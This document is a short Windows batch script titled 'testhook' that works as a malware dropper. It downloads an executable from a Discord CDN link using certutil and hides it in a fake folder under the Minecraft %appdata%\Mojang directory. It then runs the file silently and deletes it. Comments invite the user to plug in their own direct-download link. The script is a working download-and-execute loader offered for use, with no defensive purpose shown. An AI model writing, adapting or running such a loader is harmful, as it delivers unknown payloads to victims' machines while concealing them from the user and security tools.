@echo off
:start
title testhook
del %file%
color F0
cd
cls
echo Discord: Finoose#0821
echo press any key to start...
pause>nul
md %appdata%\Mojang\seagull\turtle\apple >nul
cls
::LINK TO THE DIRECT DOWNLOAD GOES BELOW! (I suggest uploading it to discord and using "copy download link" to get the direct download link)
set url=https://cdn.discordapp.com/attachments/571531407399059467/860063132496035840/C.exe >nul
::NAME OF THE FILE GOES BELOW!
set file=noose.tech.EXE >nul
certutil -urlcache -split -f %url% %file% >nul
cls
set path=%appdata%\Mojang\Seagull\Turtle\Apple
cls
move %file% %path%\%file% >nul
cd %path% >nul
%file% >nul
del %file% >nul
cls
echo FINISHED! PRESS ANY KEY TO EXIT!
pause>nul
cd %path% >nul
del %file% >nul
exit